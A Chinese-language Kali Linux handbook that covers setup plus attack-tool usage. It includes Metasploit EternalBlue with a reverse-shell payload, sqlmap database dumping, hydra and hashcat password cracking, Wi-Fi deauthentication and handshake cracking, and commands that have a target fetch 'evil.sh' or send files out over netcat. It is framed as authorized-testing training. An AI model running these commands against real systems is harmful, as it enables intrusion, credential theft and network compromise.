# Kali Linux 实战使用指南

> 渗透测试人员的标准作战平台——从安装配置到工具实战的全流程操作手册，每个章节都有可复现的步骤。

---

## 目录

- [一、Kali Linux 是什么](#一kali-linux-是什么)
- [二、安装与环境配置](#二安装与环境配置)
- [三、系统初始化](#三系统初始化)
- [四、网络配置](#四网络配置)
- [五、软件源与包管理](#五软件源与包管理)
- [六、用户与权限管理](#六用户与权限管理)
- [七、目录结构与工具分类](#七目录结构与工具分类)
- [八、核心工具实战](#八核心工具实战)
- [九、服务管理](#九服务管理)
- [十、文件传输与共享](#十文件传输与共享)
- [十一、Wireless 无线渗透](#十一wireless-无线渗透)
- [十二、常用配置技巧](#十二常用配置技巧)
- [十三、虚拟机与容器化使用](#十三虚拟机与容器化使用)
- [十四、常见问题排查](#十四常见问题排查)
- [十五、速查表](#十五速查表)

---

## 一、Kali Linux 是什么

Kali Linux 是 Offensive Security 公司维护的基于 Debian 的 Linux 发行版，预装 600+ 渗透测试工具，是渗透测试、安全审计、逆向工程、CTF 比赛的事实标准平台。

### 主要特点

- 开箱即用：安装完成即可使用全套工具，无需逐个配置
- 滚动更新：跟随 Debian Testing，工具版本始终保持最新
- 多架构支持：x86 / x64 / ARM / ARM64 均有官方镜像
- 免费开源：基于 Debian，完全免费

### 与普通 Linux 的区别

| 维度 | Kali Linux | 普通 Debian/Ubuntu |
|------|------------|--------------------|
| 默认用户 | root（早期）/ kali（新版） | 普通用户 |
| 预装工具 | 600+ 安全工具 | 仅有基础工具 |
| 软件源 | Kali 官方源 + Debian 源 | Debian/Ubuntu 官方源 |
| 内核 | 启用注入补丁（无线渗透必需） | 默认内核 |
| 服务策略 | 默认不启动网络服务 | 按发行版策略启动 |
| 安全策略 | 关闭部分防护以方便调试 | 默认开启防护 |

> 💡 **新手建议**：不要把 Kali 当作日常主力系统使用。它为攻击场景优化，许多默认配置不利于日常使用和安全防护。建议在虚拟机或专用设备上运行。

---

## 二、安装与环境配置

### 1. 镜像下载

官方镜像地址：https://www.kali.org/get-kali/

按使用场景选择：

| 镜像类型 | 适用场景 | 说明 |
|----------|----------|------|
| Installer（Netinstall） | 物理机/虚拟机正式安装 | 最小化安装，按需下载包 |
| Pre-built VM（VMware/VirtualBox/Hyper-V） | 虚拟机快速使用 | 下载即用，无需安装 |
| ARM Image | 树莓派/手机/掌机 | 烧录到 SD 卡 |
| WSL | Windows 子系统 | 适合工具调用，不适合抓包/无线 |
| Live Boot（USB） | 临时使用、不污染主机 | Rufus/Ventoy 制作启动盘 |

```bash
# 校验镜像完整性（防止下载被篡改）
sha256sum kali-linux-2025.x-installer-amd64.iso
# 与官网公布的 sha256sum 对比
```

### 2. 虚拟机安装（推荐方案）

以 VMware/VirtualBox 为例：

```bash
# 1. 下载 Pre-built VM 解压
unxz kali-linux-2025.x-vmware-amd64.7z
# 双击 .vmx 文件即可在 VMware 中打开

# 2. 默认登录凭据
# 用户名: kali
# 密码: kali

# 3. 首次登录后立即修改密码
passwd
```

虚拟机关键配置建议：

| 资源 | 推荐值 | 说明 |
|------|--------|------|
| CPU | 2 核+ | 跑 hashcat 等需要更多 |
| 内存 | 4 GB+ | Burp/Nessus 等吃内存 |
| 磁盘 | 40 GB+ | 工具和字典占空间 |
| 网络 | NAT + Host-Only | NAT 联网，Host-Only 与主机通信 |
| 显存 | 128 MB+ | 桌面流畅显示 |

### 3. 物理机安装

```bash
# 1. 制作启动 U 盘（在 Linux/macOS 上）
sudo dd if=kali-linux-installer-amd64.iso of=/dev/sdX bs=4M status=progress
sync

# 2. BIOS 关闭 Secure Boot
# 3. U 盘启动，按图形安装向导操作
# 4. 分区建议：
#    /       30 GB+（根分区）
#    /home   10 GB+（用户数据）
#    swap    内存大小（或 2 GB）
#    /boot   1 GB（可选，UEFI 必备）
```

> ⚠️ 物理机安装用于无线渗透场景（虚拟机无法直接使用 USB 无线网卡做 monitor mode）。其他场景推荐虚拟机。

---

## 三、系统初始化

首次安装完成后，按顺序执行以下初始化操作。

### 1. 系统更新

```bash
# 刷新软件源并升级所有软件
sudo apt update
sudo apt full-upgrade -y

# 清理无用包
sudo apt autoremove -y
sudo apt clean

# 重启（内核更新后必须）
sudo reboot
```

### 2. 配置时区与时间同步

```bash
# 设置上海时区
sudo timedatectl set-timezone Asia/Shanghai

# 启用 NTP 自动同步
sudo timedatectl set-ntp true

# 验证
timedatectl
date
```

### 3. 安装常用基础工具

Kali 预装工具虽多，但仍需补充一些基础工具：

```bash
sudo apt install -y \
    vim git curl wget unzip unrar \
    python3-pip python3-venv \
    docker.io docker-compose \
    htop net-tools tree \
    terminator tilix \
    flameshot git \
    fontconfig fonts-noto-cjk
```

### 4. 配置 zsh 主题（默认已启用）

Kali 默认使用 zsh + 主题，若无主题可手动启用：

```bash
# 默认 zsh 配置文件
cp /etc/skel/.zshrc ~/
source ~/.zshrc

# 切换 shell（如默认是 bash）
chsh -s /usr/bin/zsh
```

### 5. 配置中文环境（可选）

```bash
# 安装中文语言包
sudo apt install -y locales
sudo dpkg-reconfigure locales
# 勾选 zh_CN.UTF-8 UTF-8，设为默认

# 安装中文字体
sudo apt install -y fonts-noto-cjk fonts-wqy-zenhei

# 重启生效
sudo reboot
```

---

## 四、网络配置

### 1. NetworkManager（图形化推荐）

```bash
# 查看网络状态
nmcli device status

# 连接 Wi-Fi
nmcli device wifi list
nmcli device wifi connect "SSID" password "PASSWORD"

# 启用/禁用网卡
sudo nmcli device disconnect wlan0
sudo nmcli device connect wlan0
```

### 2. 静态 IP 配置

```bash
# 编辑 NetworkManager 配置
sudo nmcli connection modify "Wired connection 1" \
    ipv4.addresses 192.168.1.100/24 \
    ipv4.gateway 192.168.1.1 \
    ipv4.dns "8.8.8.8 1.1.1.1" \
    ipv4.method manual

sudo nmcli connection up "Wired connection 1"
```

### 3. /etc/network/interfaces（传统方式）

```bash
# 编辑配置文件
sudo vim /etc/network/interfaces

# 添加静态 IP 配置
auto eth0
iface eth0 inet static
    address 192.168.1.100/24
    gateway 192.168.1.1
    dns-nameservers 8.8.8.8 1.1.1.1

# 重启网络服务
sudo systemctl restart networking
```

### 4. DNS 配置

```bash
# 临时修改 DNS
sudo vim /etc/resolv.conf
# 添加：
# nameserver 8.8.8.8
# nameserver 1.1.1.1

# 永久配置（NetworkManager 管理）
sudo nmcli connection modify "Wired connection 1" \
    ipv4.dns "8.8.8.8 1.1.1.1"
sudo nmcli connection up "Wired connection 1"
```

> ⚠️ Kali 默认的 `/etc/resolv.conf` 是 systemd-resolved 生成的软链接，直接修改会被覆盖。使用 NetworkManager 配置才能持久化。

### 5. 代理配置

```bash
# 命令行临时代理
export http_proxy="http://127.0.0.1:7890"
export https_proxy="http://127.0.0.1:7890"
export all_proxy="socks5://127.0.0.1:7890"

# 写入 ~/.zshrc 持久化
echo 'export http_proxy="http://127.0.0.1:7890"' >> ~/.zshrc
echo 'export https_proxy="http://127.0.0.1:7890"' >> ~/.zshrc

# apt 代理
sudo vim /etc/apt/apt.conf.d/proxy.conf
# 添加：
# Acquire::http::Proxy "http://127.0.0.1:7890";
# Acquire::https::Proxy "http://127.0.0.1:7890";
```

---

## 五、软件源与包管理

### 1. 配置国内软件源（加速下载）

```bash
# 备份原有源
sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak

# 替换为清华源
sudo vim /etc/apt/sources.list
# 内容：
# deb https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free contrib
# deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free contrib

# 刷新源
sudo apt update
```

可用的国内源：

| 源 | 地址 |
|----|------|
| 清华大学 | https://mirrors.tuna.tsinghua.edu.cn/kali |
| 中科大 | https://mirrors.ustc.edu.cn/kali |
| 浙大 | https://mirrors.zju.edu.cn/kali |
| 阿里云 | https://mirrors.aliyun.com/kali |

### 2. 常用 apt 命令

```bash
# 更新软件源
sudo apt update

# 升级所有软件（保留配置）
sudo apt upgrade -y

# 完整升级（包括依赖关系变化的包）
sudo apt full-upgrade -y

# 安装软件
sudo apt install -y package_name

# 搜索软件
apt search keyword
apt show package_name

# 卸载软件（保留配置）
sudo apt remove package_name

# 完全卸载（含配置文件）
sudo apt purge package_name

# 清理无用依赖
sudo apt autoremove -y

# 列出已安装软件
apt list --installed
dpkg -l | grep keyword

# 查看 .deb 包内容
dpkg -c package.deb
dpkg -I package.deb
```

### 3. Kali 特有元包

Kali 通过元包组织工具集，可按需安装：

```bash
# 查看所有 Kali 元包
apt list --installed | grep kali-

# 常用元包
sudo apt install -y \
    kali-linux-large          # 大型工具集（约 10 GB）
    kali-linux-headless       # 无头模式工具集
    kali-linux-nethunter      # NetHunter 移动端工具
    kali-linux-pwtools        # 密码破解工具集
    kali-linux-web            # Web 渗透工具集
    kali-linux-forensic       # 取证工具集
    kali-linux-reverse        # 逆向工程工具集
```

### 4. pip 包管理

```bash
# 配置 pip 镜像源
pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple

# 安装 Python 包
pip install requests flask

# 使用虚拟环境
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

---

## 六、用户与权限管理

### 1. 默认用户

Kali 2020.1 之后默认创建普通用户 `kali`（密码 `kali`），不再默认使用 root。

```bash
# 切换到 root
sudo su -

# 设置 root 密码
sudo passwd root

# 启用 root 登录（SSH）
sudo vim /etc/ssh/sshd_config
# 修改：
# PermitRootLogin yes

sudo systemctl restart ssh
```

### 2. 用户管理

```bash
# 创建新用户
sudo adduser newuser

# 加入 sudo 组
sudo usermod -aG sudo newuser

# 加入 docker 组（免 sudo 使用 docker）
sudo usermod -aG docker $USER

# 删除用户
sudo userdel -r newuser

# 查看用户所属组
groups $USER
id newuser
```

### 3. sudo 免密配置（仅个人环境）

```bash
sudo visudo
# 在末尾添加：
# kali ALL=(ALL) NOPASSWD: ALL
```

> ⚠️ 生产环境强烈不建议配置 sudo 免密。

---

## 七、目录结构与工具分类

### 1. Kali 默认工具分类

Kali 按用途将工具分类，方便快速定位：

| 分类 | 主要工具 | 用途 |
|------|----------|------|
| 01 - Information Gathering | nmap, recon-ng, theHarvester, maltego | 信息收集 |
| 02 - Vulnerability Analysis | nikto, nessus, nexpose | 漏洞分析 |
| 03 - Web Application Analysis | burpsuite, sqlmap, wpscan, zap | Web 应用测试 |
| 04 - Database Assessment | sqlmap, sqlninja | 数据库评估 |
| 05 - Password Attacks | hashcat, john, hydra, cewl | 密码攻击 |
| 06 - Wireless Attacks | aircrack-ng, wifite, reaver | 无线攻击 |
| 07 - Reverse Engineering | ghidra, radare2, gdb | 逆向工程 |
| 08 - Exploitation Tools | metasploit, searchsploit, exploitdb | 漏洞利用 |
| 09 - Sniffing & Spoofing | wireshark, ettercap, bettercap | 嗅探与欺骗 |
| 10 - Post Exploitation | mimikatz, empire, bloodhound | 后渗透 |
| 11 - Forensics | autopsy, volatility, foremost | 数字取证 |
| 12 - Reporting | cutycapt, recordmydesktop | 报告生成 |
| 13 - Social Engineering | set, maltego | 社会工程学 |

### 2. 常用目录

```bash
/usr/share/            # 工具资源文件
/usr/share/wordlists/  # 字典文件
/usr/share/exploitdb/  # ExploitDB 本地副本
/usr/share/nmap/       # nmap 脚本
/usr/share/seclists/   # SecLists 字典集
/opt/                  # 第三方工具安装位置
/var/log/              # 系统日志
```

### 3. 字典文件

```bash
# 启用 SecLists（最常用的字典集）
sudo apt install -y seclists
ls /usr/share/seclists/

# 启用 rockyou 字典
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
ls -lh /usr/share/wordlists/
```

---

## 八、核心工具实战

### 1. Nmap 端口扫描

```bash
# 基础扫描
nmap 192.168.1.0/24                 # 扫描整个网段
nmap -sV 192.168.1.10               # 服务版本探测
nmap -O 192.168.1.10                # 操作系统探测
nmap -A 192.168.1.10                # 全面扫描（OS+版本+脚本+traceroute）
nmap -p- 192.168.1.10               # 扫描所有 65535 个端口
nmap -p 1-1000 192.168.1.10         # 扫描指定端口范围
nmap -sU 192.168.1.10               # UDP 扫描（慢）
nmap -sn 192.168.1.0/24             # 仅主机发现（不扫端口）
nmap --top-ports 20 192.168.1.10    # 扫描最常见的 20 个端口

# 使用 NSE 脚本
nmap --script=vuln 192.168.1.10     # 漏洞检测脚本
nmap --script=http-title 192.168.1.10  # 获取 HTTP 标题
nmap --script=smb-os-discovery 192.168.1.10  # SMB 信息收集

# 速度与隐蔽性
nmap -T4 192.168.1.10               # 加速（0-5，越高越快）
nmap -T1 192.168.1.10               # 慢速（躲避 IDS）
nmap -f 192.168.1.10                # 分片发包
nmap -D RND:10 192.168.1.10         # 伪造 10 个诱饵 IP
```

### 2. SQLMap 注入自动化

```bash
# 检测注入点
sqlmap -u "http://target.com/page?id=1"

# 指定 cookie
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=xxx"

# 获取数据库
sqlmap -u "http://target.com/page?id=1" --dbs

# 获取表
sqlmap -u "http://target.com/page?id=1" -D dbname --tables

# dump 数据
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# POST 请求注入
sqlmap -u "http://target.com/login" --data="user=admin&pass=123" -p user

# 使用请求文件（从 Burp 导出）
sqlmap -r request.txt -p id

# 调用 tamper 脚本绕过 WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment.py
```

### 3. Metasploit Framework

```bash
# 启动
msfconsole

# 初始化数据库（首次使用）
sudo msfdb init

# 常用命令
search eternalblue              # 搜索 exploit
use exploit/windows/smb/ms17_010_eternalblue  # 加载模块
show options                    # 查看参数
set RHOSTS 192.168.1.10         # 设置目标
set PAYLOAD windows/x64/meterpreter/reverse_tcp  # 设置载荷
set LHOST 192.168.1.5           # 设置本地 IP
exploit                         # 执行攻击

# meterpreter 后渗透
sysinfo                         # 系统信息
getuid                          # 当前用户
shell                           # 进入 shell
download C:\\secret.txt          # 下载文件
screenshot                      # 截屏
hashdump                        # dump 密码哈希
migrate <PID>                   # 迁移进程
portfwd add -l 8080 -p 80 -r 192.168.1.10  # 端口转发
```

### 4. Hydra 暴力破解

```bash
# SSH 爆破
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10

# FTP 爆破
hydra -L users.txt -P pass.txt ftp://192.168.1.10

# HTTP 表单爆破
hydra -l admin -P pass.txt 192.168.1.10 http-post-form \
    "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

# 指定端口和线程
hydra -l admin -P pass.txt -s 2222 -t 4 ssh://192.168.1.10
```

### 5. Hashcat 密码破解

```bash
# 查看支持的哈希类型
hashcat --help | grep -i md5

# 字典攻击（MD5）
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# 字典 + 规则（变体攻击）
hashcat -m 0 -a 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# 掩码爆破（8 位数字）
hashcat -m 0 -a 3 hash.txt ?d?d?d?d?d?d?d?d

# 通配掩码（小写字母+数字，长度 6）
hashcat -m 0 -a 3 hash.txt ?h?h?h?h?h?h

# 显示已破解结果
hashcat -m 0 hash.txt --show

# 利用 GPU（自动检测）
hashcat -m 0 -a 0 hash.txt wordlist.txt -D 2
```

常见哈希类型代码：

| 类型 | -m 值 |
|------|-------|
| MD5 | 0 |
| SHA1 | 100 |
| SHA256 | 1400 |
| SHA512 | 1700 |
| NTLM | 1000 |
| MySQL 5.x | 300 |
| bcrypt | 3200 |
| WPA2 PMKID | 16800 |

### 6. Aircrack-ng 无线攻击

```bash
# 1. 启用监听模式
sudo airmon-ng start wlan0
# 接口变为 wlan0mon

# 2. 扫描周围 AP
sudo airodump-ng wlan0mon

# 3. 锁定目标 AP（记录 BSSID 和 CH）
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 4. 抓取握手包（另开终端执行 deauth）
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon

# 5. 破解握手包
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

> ⚠️ 仅在自己拥有的网络或获得授权的网络上操作。

### 7. Wireshark 抓包分析

```bash
# 命令行启动抓包（无 GUI 环境）
sudo tshark -i eth0 -w capture.pcap

# 过滤 HTTP 流量
sudo tshark -i eth0 -Y "http" -w http.pcap

# 过滤特定 IP
sudo tshark -i eth0 -Y "ip.addr == 192.168.1.10" -w target.pcap

# Wireshark 显示过滤器
#   http.request.method == "POST"
#   tcp.port == 443
#   ip.src == 192.168.1.10 && tcp.flags.syn == 1
#   http.host contains "target"
```

### 8. Searchsploit（漏洞查询）

```bash
# 搜索漏洞
searchsploit apache 2.4
searchsploit -t "remote code execution"

# 查看 exploit 内容
searchsploit -x 12345

# 复制 exploit 到当前目录
searchsploit -m 12345

# 通过路径查看
searchsploit --path 12345
```

---

## 九、服务管理

### 1. 启动/停止服务

```bash
# 启动 Apache
sudo systemctl start apache2
sudo systemctl enable apache2     # 开机自启

# 启动 SSH
sudo systemctl start ssh
sudo systemctl enable ssh

# 启动 PostgreSQL（Metasploit 需要）
sudo systemctl start postgresql
sudo systemctl enable postgresql

# 启动 Docker
sudo systemctl start docker
sudo systemctl enable docker

# 查看服务状态
sudo systemctl status apache2
```

### 2. Kali 默认策略

Kali 默认不启动任何网络服务（避免被攻击），需要手动启动。常见服务端口：

| 服务 | 端口 | 启动命令 |
|------|------|----------|
| Apache | 80 | `sudo systemctl start apache2` |
| SSH | 22 | `sudo systemctl start ssh` |
| PostgreSQL | 5432 | `sudo systemctl start postgresql` |
| MySQL | 3306 | `sudo systemctl start mysql` |
| BeEF | 3000 | `sudo beef-xss` |
| Metasploit | 3790 | `sudo msfdb start` |

### 3. 防火墙配置

```bash
# 启用 ufw
sudo apt install -y ufw
sudo ufw enable

# 允许 SSH
sudo ufw allow 22/tcp

# 允许特定端口
sudo ufw allow 8080/tcp

# 查看状态
sudo ufw status verbose
```

---

## 十、文件传输与共享

### 1. HTTP 服务（最快的方式）

```bash
# 在 Kali 上启动 HTTP 服务
sudo python3 -m http.server 8080
# 或使用 Ruby
ruby -run -ehttpd . -p8080

# 目标机器下载文件
wget http://kali-ip:8080/evil.sh
curl -O http://kali-ip:8080/evil.sh
```

### 2. SMB 服务

```bash
# 启动 SMB 服务
sudo systemctl start smbd

# 创建共享目录
sudo mkdir /home/kali/share
sudo chmod 777 /home/kali/share

# 配置共享
sudo vim /etc/samba/smb.conf
# 添加：
# [share]
#    path = /home/kali/share
#    browseable = yes
#    writable = yes
#    guest ok = yes

# 重启服务
sudo systemctl restart smbd

# Windows 端访问
# \\kali-ip\share
```

### 3. NC 传输

```bash
# 接收端（Kali）
nc -lvp 4444 > received_file

# 发送端（目标）
nc kali-ip 4444 < file_to_send
```

### 4. SCP / SFTP

```bash
# 上传到远程
scp file.txt user@remote:/tmp/

# 从远程下载
scp user@remote:/tmp/file.txt .

# SFTP 交互式
sftp user@remote
sftp> get /remote/file /local/path
sftp> put /local/file /remote/path
```

### 5. impacket 套件

```bash
# 使用 smbserver 一键启动共享
sudo impacket-smbserver share /home/kali/share

# Windows 端复制文件
copy \\kali-ip\share\file.exe C:\Temp\
```

---

## 十一、Wireless 无线渗透

### 1. 无线网卡要求

- 必须支持 **Monitor Mode**（监听模式）和 **Packet Injection**（数据包注入）
- 虚拟机中需要将 USB 网卡直通到虚拟机
- 推荐芯片：Atheros AR9271、Ralink RT3070、Realtek 8812AU

```bash
# 查看网卡是否支持监听模式
iwconfig
# Mode:Managed 表示普通模式
# Mode:Monitor 表示监听模式

# 启用监听模式
sudo airmon-ng start wlan0

# 检查是否有干扰进程
sudo airmon-ng check kill
```

### 2. Wifite 一键化攻击

```bash
# 启动 wifite
sudo wifite

# 自动扫描并选择目标进行攻击
# 支持 WPS PIN、PMKID、WPA/WPA2 握手包等多种攻击方式
```

### 3. Reaver WPS 爆破

```bash
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
```

---

## 十二、常用配置技巧

### 1. 调整终端提示符

```bash
# 编辑 ~/.zshrc，修改 PROMPT
PROMPT='%F{green}%n@%m%f %F{blue}%~%f %# '
```

### 2. 配置 alias

```bash
# 编辑 ~/.zshrc
alias ll='ls -alF'
alias update='sudo apt update && sudo apt upgrade -y'
alias ports='sudo netstat -tulanp'
alias myip='curl ifconfig.me'

# 立即生效
source ~/.zshrc
```

### 3. 配置 Vim

```bash
# 安装 vim-plug
curl -fLo ~/.vim/autoload/plug.vim --create-dirs \
    https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim

# 编辑 ~/.vimrc
cat > ~/.vimrc <<EOF
set number
set tabstop=4
set shiftwidth=4
set expandtab
set autoindent
syntax on
call plug#begin('~/.vim/plugged')
Plug 'preservim/nerdtree'
call plug#end()
EOF
```

### 4. SSH 配置

```bash
# 启用 SSH 服务
sudo systemctl enable --now ssh

# 生成密钥
ssh-keygen -t ed25519 -C "kali@kali"

# 配置免密登录目标
ssh-copy-id user@target

# 配置 ~/.ssh/config
cat > ~/.ssh/config <<EOF
Host target
    HostName 192.168.1.10
    User admin
    Port 22
    IdentityFile ~/.ssh/id_ed25519
EOF

# 直接连接
ssh target
```

### 5. 截图工具

```bash
# 安装 flameshot
sudo apt install -y flameshot

# 绑定快捷键（GUI 设置）
# Settings -> Keyboard Shortcuts -> Custom Shortcuts
# Command: flameshot gui
# Shortcut: Print Screen
```

---

## 十三、虚拟机与容器化使用

### 1. VMware Tools / Open-VM-Tools

```bash
# 安装 open-vm-tools（推荐）
sudo apt install -y open-vm-tools open-vm-tools-desktop

# 重启后即可使用：
# - 自适应分辨率
# - 共享剪贴板
# - 拖放文件
# - 共享文件夹
sudo reboot
```

### 2. VirtualBox 增强功能

```bash
# VirtualBox 菜单 -> 设备 -> 安装增强功能
sudo cp /media/cdrom/VBoxLinuxAdditions.run /tmp/
cd /tmp
sudo chmod +x VBoxLinuxAdditions.run
sudo ./VBoxLinuxAdditions.run
sudo reboot
```

### 3. 共享文件夹

```bash
# VMware 中设置共享文件夹
# VM -> Settings -> Options -> Shared Folders -> 启用并添加

# 挂载共享文件夹
sudo mkdir /mnt/shared
sudo mount -t vmhgfs .host:/shared /mnt/shared

# 开机自动挂载
echo '.host:/shared /mnt/shared vmhgfs defaults 0 0' | sudo tee -a /etc/fstab
```

### 4. Docker 使用

```bash
# 启动 Docker
sudo systemctl start docker

# 拉取常用镜像
sudo docker pull kalilinux/kali-rolling
sudo docker pull vulnerables/web-dvwa

# 运行 DVWA 靶场
sudo docker run -d -p 80:80 vulnerables/web-dvwa

# 进入 Kali 容器（仅命令行工具）
sudo docker run -it kalilinux/kali-rolling /bin/bash

# 在容器中安装工具
apt update
apt install -y nmap sqlmap
```

### 5. 快照与备份

```bash
# VMware 快照（图形界面操作）
# VM -> Snapshot -> Take Snapshot

# 命令行导出虚拟机
# 在主机上执行
vmware-vdiskmanager -r source.vmdk -t 0 target.vmdk
```

---

## 十四、常见问题排查

### 1. 网络不通

```bash
# 1. 检查网卡
ip addr
ifconfig

# 2. 重启网络服务
sudo systemctl restart NetworkManager

# 3. 检查 DNS
nslookup google.com

# 4. 检查路由
ip route
traceroute 8.8.8.8

# 5. 检查防火墙
sudo ufw status
sudo iptables -L -n
```

### 2. 软件源更新失败

```bash
# 1. 检查网络
ping mirrors.tuna.tsinghua.edu.cn

# 2. 检查源配置
cat /etc/apt/sources.list

# 3. 清除缓存
sudo apt clean
sudo apt update

# 4. 跳过 HTTPS 验证（临时方案）
sudo apt -o Acquire::https::Verify-Peer=false update
```

### 3. 无线网卡无法监听

```bash
# 1. 检查网卡是否支持监听
iw list | grep "Monitor"

# 2. 检查干扰进程
sudo airmon-ng check

# 3. 杀掉干扰进程
sudo airmon-ng check kill

# 4. 重新启用监听
sudo airmon-ng start wlan0

# 5. 检查是否被 NetworkManager 接管
sudo rfkill list
sudo rfkill unblock all
```

### 4. Burp Suite 无法抓包

```bash
# 1. 检查代理设置
# Firefox: Preferences -> Network Settings -> Manual Proxy
#   HTTP Proxy: 127.0.0.1
#   Port: 8080

# 2. 安装证书
# 访问 http://burp -> 下载 CA 证书 -> 导入 Firefox

# 3. 检查端口占用
sudo netstat -tlnp | grep 8080

# 4. 重启 Burp
```

### 5. 磁盘空间不足

```bash
# 1. 查看磁盘占用
df -h
du -sh /* 2>/dev/null | sort -h

# 2. 清理 apt 缓存
sudo apt clean
sudo apt autoremove -y

# 3. 清理日志
sudo journalctl --vacuum-time=7d

# 4. 清理 Docker
sudo docker system prune -a

# 5. 清理用户缓存
rm -rf ~/.cache/*
```

### 6. 图形界面卡顿

```bash
# 1. 检查内存
free -h

# 2. 检查 CPU
top
htop

# 3. 关闭不必要的桌面特效
# Settings -> Appearance -> Effects -> None

# 4. 降低分辨率
xrandr --output Virtual1 --mode 1280x720
```

### 7. 时区错误

```bash
# 查看时区
timedatectl

# 设置时区
sudo timedatectl set-timezone Asia/Shanghai

# 启用 NTP
sudo timedatectl set-ntp true
```

---

## 十五、速查表

### 系统操作

| 操作 | 命令 |
|------|------|
| 系统更新 | `sudo apt update && sudo apt full-upgrade -y` |
| 重启 | `sudo reboot` |
| 关机 | `sudo poweroff` |
| 查看系统信息 | `uname -a` |
| 查看 Kali 版本 | `cat /etc/os-release` |
| 查看磁盘 | `df -h` |
| 查看内存 | `free -h` |
| 查看进程 | `top` 或 `htop` |
| 查看端口 | `sudo netstat -tulanp` |
| 查找文件 | `find / -name "filename"` |

### 工具启动

| 工具 | 命令 |
|------|------|
| Burp Suite | `burpsuite` |
| Metasploit | `msfconsole` |
| Nmap | `nmap` |
| Wireshark | `wireshark` |
| SQLMap | `sqlmap -u URL` |
| Hashcat | `hashcat -m 0 -a 0 hash wordlist` |
| John | `john --wordlist=wordlist hash` |
| Hydra | `hydra -l user -P pass service://target` |
| Aircrack-ng | `aircrack-ng -w wordlist capture.cap` |
| Searchsploit | `searchsploit keyword` |
| Ghidra | `ghidra` |
| Maltego | `maltego` |

### 服务管理

| 操作 | 命令 |
|------|------|
| 启动服务 | `sudo systemctl start service` |
| 停止服务 | `sudo systemctl stop service` |
| 重启服务 | `sudo systemctl restart service` |
| 开机自启 | `sudo systemctl enable service` |
| 禁用自启 | `sudo systemctl disable service` |
| 查看状态 | `sudo systemctl status service` |

### 文件传输

| 场景 | 命令 |
|------|------|
| HTTP 下载 | `wget http://kali:8080/file` |
| HTTP 服务 | `python3 -m http.server 8080` |
| SCP 上传 | `scp file user@host:/path` |
| SCP 下载 | `scp user@host:/path/file .` |
| NC 接收 | `nc -lvp 4444 > file` |
| NC 发送 | `nc host 4444 < file` |
| SMB 共享 | `impacket-smbserver share /path` |

### 网络诊断

| 操作 | 命令 |
|------|------|
| 查看网卡 | `ip addr` |
| 查看路由 | `ip route` |
| 查看监听端口 | `ss -tlnp` |
| DNS 查询 | `dig example.com` |
| 跟踪路由 | `traceroute 8.8.8.8` |
| 抓包 | `sudo tshark -i eth0 -w cap.pcap` |
| 网卡监听 | `sudo airmon-ng start wlan0` |

### 默认凭据

| 系统 | 用户名 | 密码 |
|------|--------|------|
| Kali 2020.1+ | kali | kali |
| Kali 2020.1 之前 | root | toor |
| Kali WSL | kali | kali |
| Kali ARM | kali | kali |
| Kali NetHunter | kali | kali |

> ⚠️ 首次登录后立即修改默认密码：`passwd`

---

## 结语

Kali Linux 是渗透测试人员的标准作战平台，但它本身只是一个载体——真正决定测试效果的是工具背后的知识和实战经验。建议：

1. 先熟悉 Linux 基础操作，再深入学习安全工具
2. 每个工具都要在合法靶场（DVWA、HackTheBox、TryHackMe）上反复练习
3. 不要把 Kali 当作日常主力系统，避免养成不良使用习惯
4. 始终在获得授权的目标上进行测试，遵守法律法规

> 法律提示：未经授权对他人系统进行渗透测试属于违法行为，可能面临刑事处罚。本文所述技术仅用于合法授权的安全测试和学习教育目的。
